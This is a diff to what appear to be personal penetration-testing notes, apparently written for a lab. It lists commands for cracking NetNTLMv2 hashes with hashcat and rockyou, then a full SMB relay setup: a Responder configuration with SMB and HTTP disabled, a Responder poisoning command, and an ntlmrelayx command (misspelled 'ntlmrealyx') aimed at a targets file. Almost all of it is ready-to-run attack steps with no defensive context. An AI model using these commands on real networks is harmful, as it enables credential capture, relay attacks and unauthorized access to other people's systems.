@@ -33,3 +33,25 @@ https://www.google.com/search?client=firefox-b-e&q=hashcat+wordlist
 hashcat --help | grep NTLM
 hashcat -m 5600 hash0.txt rockyou.txt --force
 
+SMB RELAY:
+
+responder config: turn off SMB and HTTP
+/usr/share/responder> gedit Responder.conf
+
+SQL = On
+SMB = Off
+RDP = On
+Kerberos = On
+FTP = On
+POP = On
+SMTP = On
+IMAP = On
+HTTP = Off
+HTTPS = On
+DNS = On
+LDAP = On
+
+/usr/share/responder> python Responder.py -I tun0 -i 192.168.0.27 -rdw -v
+
+python ntlmrealyx.py -tf targets.txt -smb2support
+
